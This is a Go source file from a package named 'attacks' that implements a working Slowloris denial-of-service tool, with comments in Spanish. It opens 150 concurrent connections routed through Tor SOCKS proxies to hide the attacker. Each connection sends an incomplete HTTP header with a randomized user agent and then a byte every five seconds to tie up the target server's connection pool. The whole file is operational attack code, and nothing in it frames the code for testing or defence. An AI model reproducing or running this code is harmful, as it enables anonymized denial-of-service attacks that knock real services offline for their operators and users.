package attacks

import (
	"context"
	"fmt"
	"net"
	"sync/atomic"
	"time"
)

// Slowloris agota el pool de conexiones del servidor
// Mantiene cientos de conexiones abiertas con headers incompletos
// El servidor las mantiene esperando el fin del request — nunca llega
func Slowloris(ctx context.Context, host string, port int, torPorts []int, stats *Stats) {
	workers := 150
	if len(torPorts) == 0 {
		return
	}

	for i := 0; i < workers; i++ {
		torPort := torPorts[i%len(torPorts)]
		go slowlorisWorker(ctx, host, port, torPort, stats)
	}
}

func slowlorisWorker(ctx context.Context, host string, targetPort int, torPort int, stats *Stats) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn := dialViaSocks(torPort, host, targetPort)
			if conn == nil {
				time.Sleep(2 * time.Second)
				continue
			}

			// Header inicial incompleto — el servidor espera el resto
			header := fmt.Sprintf(
				"GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nX-Custom: ",
				time.Now().UnixNano(), host, randomUA(),
			)
			conn.Write([]byte(header))
			atomic.AddInt64(&stats.Slowloris, 1)
			atomic.AddInt64(&stats.Total, 1)

			// Mantener conexión viva enviando bytes pequeños cada 5s
			ticker := time.NewTicker(5 * time.Second)
			alive := true
			for alive {
				select {
				case <-ctx.Done():
					conn.Close()
					ticker.Stop()
					return
				case <-ticker.C:
					_, err := conn.Write([]byte("a"))
					if err != nil {
						alive = false
					} else {
						atomic.AddInt64(&stats.Slowloris, 1)
						atomic.AddInt64(&stats.Total, 1)
					}
				}
			}
			conn.Close()
			ticker.Stop()
		}
	}
}

func dialViaSocks(socksPort int, host string, port int) net.Conn {
	d := makeSocksDialer(socksPort)
	conn, err := d.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return nil
	}
	conn.SetDeadline(time.Now().Add(60 * time.Second))
	return conn
}
